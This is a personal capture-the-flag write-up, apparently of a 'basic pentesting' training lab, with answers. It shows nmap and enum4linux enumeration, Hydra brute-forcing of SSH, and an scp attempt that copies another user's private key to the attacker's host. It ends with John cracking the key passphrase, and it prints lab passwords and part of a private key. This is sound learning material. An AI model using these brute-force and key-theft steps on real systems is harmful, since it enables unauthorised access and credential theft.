#### basic pentesting 

export IP: 10.10.35.77

In these set of tasks you'll learn the following:

- brute forcing 
- hash cracking 
- service enumeration
- Linux Enumeration


The main goal here is to learn as much as possible. Make sure you are connected to our network using your OpenVPN configuration file.

Credits to Josiah Pierce from Vulnhub.

Deploy the machine and connect to our network

Find the services exposed by the machine

- use nmap to scan for available ports
```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/basic_pentesting]
└─$ nmap -sC -sV -oN nmap_results.txt 10.10.35.77 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 00:57 EDT
Nmap scan report for 10.10.35.77
Host is up (0.35s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-08-15T04:58:20
|_  start_date: N/A
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-08-15T00:58:20-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.30 seconds

```


What is the name of the hidden directory on the web server(enter name without /)?
Ans. development


Use brute-forcing to find the username & password
-Used enum4linux for discovering SMB shares and hopefully to look for passwords also:

```
enum4linux -a 10.10.35.77 -o smb_enum.txt
```


What is the username?
Ans. Jan

```
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)


```

What is the password?
Ans. armando

```

┌──(kali㉿kali)-[~/ken/MoonShine/CTF/basic_pentesting]
└─$ smbclient //10.10.40.174/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> pwd
Current directory is \\10.10.40.174\anonymous\
smb: \> dir
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018
get star
                14318640 blocks of size 1024. 11093576 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 
```

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/basic_pentesting]
└─$ hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.40.174 ssh
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-15 03:17:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.40.174:22/
[STATUS] 128.00 tries/min, 128 tries in 00:01h, 14344273 to do in 1867:45h, 14 active
[STATUS] 98.67 tries/min, 296 tries in 00:03h, 14344105 to do in 2422:60h, 14 active
[STATUS] 92.29 tries/min, 646 tries in 00:07h, 14343755 to do in 2590:28h, 14 active
[22][ssh] host: 10.10.40.174   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-15 03:26:26
                                                                                                                      
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/basic_pentesting]
└─$ 

```


What service do you use to access the server(answer in abbreviation in all caps)?
- SSH


Enumerate the machine to find any vectors for privilege escalation


```
jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@basic2:/home/kay$ cd .ssh
jan@basic2:/home/kay/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
jan@basic2:/home/kay/.ssh$ scp id_rsa kali@10.2.77.171:/home/kali/ken/MoonShine/CTF/basic_pentesting
ssh: connect to host 10.2.77.171 port 22: Connection refused
lost connection
jan@basic2:/home/kay/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
jan@basic2:/home/kay/.ssh$ 
```

Notes:
- after multiple attempts of failing to scp, I decided to just copy paste the id_rsa key directly to my machine:
- 
```
jan@basic2:/home/kay/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ
o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN
XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX
AkAN+3T5FU49AEVKBJtZnLTEBw31mxjv0lLXAqIaX5QfeXMacIQOUWCHATlpVXmN
lG4BaG7cVXs1AmPieflx7uN4RuB9NZS4Zp0lplbCb4UEawX0Tt+VKd6kzh+Bk0aU
hWQJCdnb/U+dRasu3oxqyklKU2dPseU7rlvPAqa6y+ogK/woTbnTrkRngKqLQxMl
lIWZye4yrLETfc275hzVVYh6FkLgtOfaly0bMqGIrM+eWVoXOrZPBlv8iyNTDdDE
3jRjqbOGlPs01hAWKIRxUPaEr18lcZ+OlY00Vw2oNL2xKUgtQpV2jwH04yGdXbfJ
LYWlXxnJJpVMhKC6a75pe4ZVxfmMt0QcK4oKO1aRGMqLFNwaPxJYV6HauUoVExN7
bUpo+eLYVs5mo5tbpWDhi0NRfnGP1t6bn7Tvb77ACayGzHdLpIAqZmv/0hwRTnrb
RVhY1CUf7xGNmbmzYHzNEwMppE2i8mFSaVFCJEC3cDgn5TvQUXfh6CJJRVrhdxVy
VqVjsot+CzF7mbWm5nFsTPPlOnndC6JmrUEUjeIbLzBcW6bX5s+b95eFeceWMmVe
B0WhqnPtDtVtg3sFdjxp0hgGXqK4bAMBnM4chFcK7RpvCRjsKyWYVEDJMYvc87Z0
ysvOpVn9WnFOUdON+U4pYP6PmNU4Zd2QekNIWYEXZIZMyypuGCFdA0SARf6/kKwG
oHOACCK3ihAQKKbO+SflgXBaHXb6k0ocMQAWIOxYJunPKN8bzzlQLJs1JrZXibhl


```

- After successful copy/paste the id_rsa, i decided to ssh the user key but id_rsa needs passphrase:
```

┌──(kali㉿kali)-[~/ken/MoonShine/CTF/basic_pentesting]
└─$ sudo nano id_rsa
[sudo] password for kali: 
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/basic_pentesting]
└─$ ssh -i id_rsa kay@10.10.70.111                     
Enter passphrase for key 'id_rsa': 

```

- using ssh2john, i converted the id_rsa key to hash to successfully crack the password:

Password: beeswax

```

┌──(kali㉿kali)-[~/ken/MoonShine/CTF/basic_pentesting]
└─$ ssh2john id_rsa > hashprase_kay.txt
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/basic_pentesting]
└─$ ls
gobuster_scan.txt  hashprase_kay.txt  id_rsa  login_smb.txt  nmap_results.txt  README.md  staff.txt
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/basic_pentesting]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashprase_kay.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2022-08-15 09:47) 6.250g/s 517200p/s 517200c/s 517200C/s bird..bammer
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/basic_pentesting]
└─$ 

```

![[Pasted image 20220815094830.png]]

- After acquiring the password, logging in to ssh with user kay was easy:

```

┌──(kali㉿kali)-[~/ken/MoonShine/CTF/basic_pentesting]
└─$ ssh -i id_rsa kay@10.10.70.111     
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$ 


```

flag: 

![[Pasted image 20220815095201.png]]

END